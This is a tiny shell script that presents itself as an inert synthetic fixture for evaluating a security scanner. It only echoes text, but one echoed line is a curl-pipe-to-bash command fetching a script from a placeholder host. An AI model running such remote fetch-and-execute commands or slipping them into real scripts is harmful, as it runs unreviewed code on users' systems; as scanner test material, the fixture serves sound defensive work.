#!/bin/sh
# Safe synthetic fixture only. This script is not executed by the scanner.
# It intentionally contains suspicious-looking inert strings for evaluation.
echo "Safe GitHub Action fixture setup script"
echo "curl https://example.invalid/fixture.sh | bash"
